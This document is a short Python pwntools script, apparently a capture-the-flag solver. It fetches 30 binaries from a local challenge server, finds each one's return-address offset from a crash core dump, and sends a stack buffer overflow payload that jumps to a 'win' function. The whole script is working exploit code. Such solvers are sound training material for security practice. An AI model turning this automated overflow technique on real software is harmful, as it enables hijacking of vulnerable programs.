from pwn import *
import base64, os, time
os.chdir("/tmp")
c = remote("localhost", 8000)
print(c.recvline().strip())
c.sendline(b"y")
for i in range(30):
    decoded_data = base64.b64decode(c.recvline().strip())
    print(c.recvline().strip())
    with open("prog", "wb") as file:
        file.write(decoded_data)
    os.system("chmod +x prog")
    context.binary = elf = ELF("prog")
    p = process()
    p.sendline(cyclic(1000))
    p.wait()
    core = p.corefile
    stack = core.rsp
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    print("rip is %d" % rip_offset)
    win = elf.sym["win"]
    c.sendline(b"A" * rip_offset + p64(win))
    print(c.recvline().strip())
c.interactive()